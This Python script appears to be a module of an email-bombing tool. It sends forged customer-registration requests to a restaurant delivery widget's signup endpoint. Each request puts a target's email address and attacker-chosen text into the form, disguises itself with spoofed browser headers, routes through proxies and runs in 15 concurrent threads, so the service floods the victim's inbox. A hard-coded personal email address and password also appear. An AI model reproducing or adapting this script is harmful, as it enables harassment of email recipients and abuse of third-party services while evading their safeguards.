import json
from os.path import basename

import requests

import module
from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        headers = {
            'authority': 'deliverywiget.iiko.ru',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.expressroll.ru',
            'referer': 'https://www.expressroll.ru/',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        data = {
            'json': json.dumps(
                {"name": self.get_text(), "email": target, "phone": "+71231231231", "password": "Zxcasdqwe123",
                 "passwordRepeat": "Zxcasdqwe123", "phoneValidationCode": None, "cardNumber": "",
                 "restaraunt": "99583f61-6c21-11e8-80cd-d8d385655247"}),
            'lang': 'ru',
        }

        response = requests.post(
            'https://deliverywiget.iiko.ru/Customer/Register/99583f61-6c21-11e8-80cd-d8d385655247',
            headers=headers,
            data=data,
            proxies=self.get_proxies()
        )
        print(response.text)
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], '"success": true')
    res = spam.send_post('softumwork@gmail.com'.replace('@', f'+{module.generate_text(10)}@'))
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
